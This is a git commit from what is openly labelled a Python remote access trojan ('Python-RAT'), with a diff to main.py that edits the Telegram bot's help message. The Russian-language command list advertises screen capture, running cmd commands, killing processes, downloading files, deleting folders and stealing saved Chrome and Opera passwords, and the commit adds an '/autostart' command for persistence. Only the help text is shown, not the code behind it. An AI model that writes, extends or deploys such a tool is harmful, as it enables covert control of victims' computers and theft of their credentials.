0b730c0f17faa159b6c0cf1f2bbdc4fcb5fbe9a1
Unknown <wendlevis@gmail.com>
2025-06-17 05:50:53 +0300

    Python-RAT

--- main.py
+++ main.py
@@ -25,7 +25,7 @@ def send_message(command):
 @bot.message_handler(commands=['help', 'commands', 'Help', 'Commands']) # Commands
 def send_message(command):
     bot.send_message(chat_id, "Команды: \n /Screen - Скриншот экрана \n /Info - Инфо о юзере \n /kill_process name.exe - Убить процесс по имени" +
-                    "\n /Pwd - Узнать текущую директорию \n /passwords chrome - Пароли гугл хром \n /passwords opera - Пароли опера" +
+                    "\n /Pwd - Узнать текущую директорию \n /autostart - Добавить ратник в автостарт \n /passwords chrome - Пароли гугл хром \n /passwords opera - Пароли опера" +
                     "\n /Cmd command - Выполнить команду в cmd  \n /Open_url - Открыть ссылку \n /Ls - все папки и файлы в директории" +
                     "\n /Cd folder - перейти в папку \n /Download - скачать файл \n /Rm_dir - удалить папку" + 
                     "\n\n /About - о RAT'e")
